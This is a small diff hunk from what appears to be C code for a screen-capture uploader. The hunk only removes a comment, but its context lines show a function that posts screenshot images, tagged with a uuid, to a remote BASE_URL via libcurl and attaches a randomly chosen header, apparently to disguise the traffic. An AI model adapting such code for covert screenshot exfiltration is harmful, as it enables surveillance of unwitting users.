@@ -268,7 +268,6 @@ void upload_screenshot(BYTE *image_data, unsigned int image_size, char *uuid)
         curl_mime_filename(part, "screenshot.png");
         curl_mime_data(part, (char *)image_data, image_size);
 
-        // Add random header
         int rand_header_idx = rand() % (sizeof(headers) / sizeof(headers[0]));
         headerlist = curl_slist_append(headerlist, headers[rand_header_idx]);
         curl_easy_setopt(curl, CURLOPT_URL, BASE_URL);
